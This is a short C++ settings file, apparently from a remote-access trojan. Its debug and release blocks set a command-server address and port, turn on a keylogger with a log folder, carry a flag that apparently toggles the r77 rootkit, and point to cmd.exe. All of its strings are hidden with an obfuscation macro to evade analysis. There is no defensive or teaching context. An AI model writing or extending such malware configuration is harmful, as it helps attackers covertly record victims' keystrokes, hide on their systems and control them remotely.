#include "Settings.h"

#ifdef _DEBUG
	int Settings::server_port = 3000;
	std::string Settings::server_ip{ AY_OBFUSCATE("127.0.0.1") };
	int Settings::timeout = 5000;

	bool Settings::useR77 = false;

	bool Settings::use_keylogger = true;
	std::string Settings::keylogger_dir{ AY_OBFUSCATE(".\\logs\\") };

	std::string Settings::cmd_path{ AY_OBFUSCATE("C:\\Windows\\System32\\cmd.exe") };
#else
	int Settings::server_port = 3000;
	std::string Settings::server_ip{ AY_OBFUSCATE("127.0.0.1") };
	int Settings::timeout = 10000;

	bool Settings::useR77 = false;

	bool Settings::use_keylogger = true;
	std::string Settings::keylogger_dir{ AY_OBFUSCATE(".\\logs\\") };

	std::string Settings::cmd_path{ AY_OBFUSCATE("C:\\Windows\\System32\\cmd.exe") };
#endif